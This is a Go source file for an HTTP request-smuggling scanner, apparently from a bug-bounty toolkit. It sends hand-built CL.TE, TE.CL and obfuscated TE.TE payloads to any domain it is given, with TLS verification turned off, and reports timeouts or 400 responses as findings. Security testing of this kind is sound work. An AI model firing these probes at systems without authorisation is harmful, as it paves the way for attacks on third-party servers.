// ============================================================================
// Sentinel Pro v3.0 — Professional OSINT & Bug Bounty Platform
// Copyright (c) 2026 @who_is_the_black_hat. All rights reserved.
//
// Unauthorized copying, distribution, or modification of this software,
// via any medium, is strictly prohibited without written permission.
// ============================================================================

package main

import (
	"bufio"
	"crypto/tls"
	"encoding/json"
	"fmt"
	"net"
	"os"
	"strings"
	"time"
)

type Finding struct {
	Type      string  `json:"type"`
	URL       string  `json:"url"`
	Technique string  `json:"technique"`
	Evidence  string  `json:"evidence"`
	Severity  string  `json:"severity"`
	TimeDelta float64 `json:"time_delta_ms"`
}

type Result struct {
	Domain   string    `json:"domain"`
	Findings []Finding `json:"findings"`
	Total    int       `json:"total"`
	Error    string    `json:"error,omitempty"`
}

func main() {
	if len(os.Args) < 2 {
		fmt.Fprintln(os.Stderr, "Usage: smuggler <domain>")
		os.Exit(1)
	}

	domain := os.Args[1]
	result := Result{Domain: domain, Findings: []Finding{}}

	findings := []Finding{}

	// Test CL.TE smuggling
	if f := testCLTE(domain); f != nil {
		findings = append(findings, *f)
	}

	// Test TE.CL smuggling
	if f := testTECL(domain); f != nil {
		findings = append(findings, *f)
	}

	// Test TE.TE (obfuscated Transfer-Encoding)
	if f := testTETE(domain); f != nil {
		findings = append(findings, *f)
	}

	result.Findings = findings
	result.Total = len(findings)

	out, _ := json.Marshal(result)
	fmt.Println(string(out))
}

// CL.TE: frontend uses Content-Length, backend uses Transfer-Encoding
// We send a request where CL says body is longer than TE chunk says
func testCLTE(domain string) *Finding {
	// Payload: CL=6 but TE chunk ends at 3 bytes — backend sees leftover "G"
	payload := "POST / HTTP/1.1\r\n" +
		"Host: " + domain + "\r\n" +
		"Content-Type: application/x-www-form-urlencoded\r\n" +
		"Content-Length: 6\r\n" +
		"Transfer-Encoding: chunked\r\n" +
		"Connection: keep-alive\r\n" +
		"\r\n" +
		"0\r\n" +
		"\r\n" +
		"G"

	start := time.Now()
	resp, err := sendRaw(domain, 443, payload, true)
	elapsed := time.Since(start).Milliseconds()

	if err != nil {
		// Try port 80
		resp, err = sendRaw(domain, 80, payload, false)
		elapsed = time.Since(start).Milliseconds()
	}

	if err != nil {
		return nil
	}

	// Indicators: timeout (>5s = backend waiting for more data) or 400/500 with smuggling keywords
	if elapsed > 4000 {
		return &Finding{
			Type:      "HTTP Request Smuggling",
			URL:       "https://" + domain,
			Technique: "CL.TE",
			Evidence:  fmt.Sprintf("Backend timed out waiting for chunked body (%dms) — CL.TE likely", elapsed),
			Severity:  "CRITICAL",
			TimeDelta: float64(elapsed),
		}
	}

	if strings.Contains(resp, "400") && (strings.Contains(resp, "Bad Request") || strings.Contains(resp, "Invalid")) {
		// Some servers return 400 on malformed smuggling attempt — inconclusive but flag
		return &Finding{
			Type:      "HTTP Request Smuggling",
			URL:       "https://" + domain,
			Technique: "CL.TE (possible)",
			Evidence:  "Server returned 400 on CL+TE conflict — may be detecting/blocking smuggling",
			Severity:  "HIGH",
			TimeDelta: float64(elapsed),
		}
	}

	_ = resp
	return nil
}

// TE.CL: frontend uses Transfer-Encoding, backend uses Content-Length
func testTECL(domain string) *Finding {
	// Chunk size says 3 bytes ("abc") but CL=4 — backend reads one extra byte
	payload := "POST / HTTP/1.1\r\n" +
		"Host: " + domain + "\r\n" +
		"Content-Type: application/x-www-form-urlencoded\r\n" +
		"Content-Length: 4\r\n" +
		"Transfer-Encoding: chunked\r\n" +
		"Connection: keep-alive\r\n" +
		"\r\n" +
		"3\r\n" +
		"abc\r\n" +
		"0\r\n" +
		"\r\n"

	start := time.Now()
	resp, err := sendRaw(domain, 443, payload, true)
	elapsed := time.Since(start).Milliseconds()

	if err != nil {
		resp, err = sendRaw(domain, 80, payload, false)
		elapsed = time.Since(start).Milliseconds()
	}

	if err != nil {
		return nil
	}

	if elapsed > 4000 {
		return &Finding{
			Type:      "HTTP Request Smuggling",
			URL:       "https://" + domain,
			Technique: "TE.CL",
			Evidence:  fmt.Sprintf("Backend timed out on TE.CL probe (%dms)", elapsed),
			Severity:  "CRITICAL",
			TimeDelta: float64(elapsed),
		}
	}

	_ = resp
	return nil
}

// TE.TE: both use Transfer-Encoding but one can be obfuscated
func testTETE(domain string) *Finding {
	// Obfuscated TE header — some servers ignore the second one
	payload := "POST / HTTP/1.1\r\n" +
		"Host: " + domain + "\r\n" +
		"Content-Type: application/x-www-form-urlencoded\r\n" +
		"Content-Length: 4\r\n" +
		"Transfer-Encoding: chunked\r\n" +
		"Transfer-Encoding: identity\r\n" +
		"Connection: keep-alive\r\n" +
		"\r\n" +
		"3\r\n" +
		"abc\r\n" +
		"X\r\n" +
		"\r\n"

	start := time.Now()
	resp, err := sendRaw(domain, 443, payload, true)
	elapsed := time.Since(start).Milliseconds()

	if err != nil {
		resp, err = sendRaw(domain, 80, payload, false)
		elapsed = time.Since(start).Milliseconds()
	}

	if err != nil {
		return nil
	}

	if elapsed > 4000 {
		return &Finding{
			Type:      "HTTP Request Smuggling",
			URL:       "https://" + domain,
			Technique: "TE.TE (obfuscated)",
			Evidence:  fmt.Sprintf("Timeout on dual TE headers probe (%dms)", elapsed),
			Severity:  "CRITICAL",
			TimeDelta: float64(elapsed),
		}
	}

	_ = resp
	return nil
}

func sendRaw(domain string, port int, payload string, useTLS bool) (string, error) {
	addr := fmt.Sprintf("%s:%d", domain, port)

	var conn net.Conn
	var err error

	dialer := &net.Dialer{Timeout: 6 * time.Second}

	if useTLS {
		conn, err = tls.DialWithDialer(dialer, "tcp", addr, &tls.Config{
			InsecureSkipVerify: true,
			ServerName:         domain,
		})
	} else {
		conn, err = dialer.Dial("tcp", addr)
	}

	if err != nil {
		return "", err
	}
	defer conn.Close()

	conn.SetDeadline(time.Now().Add(6 * time.Second))
	_, err = conn.Write([]byte(payload))
	if err != nil {
		return "", err
	}

	// Read response with 5s timeout
	conn.SetReadDeadline(time.Now().Add(5 * time.Second))
	reader := bufio.NewReader(conn)
	var sb strings.Builder
	for {
		line, err := reader.ReadString('\n')
		sb.WriteString(line)
		if err != nil || sb.Len() > 4096 {
			break
		}
	}

	return sb.String(), nil
}
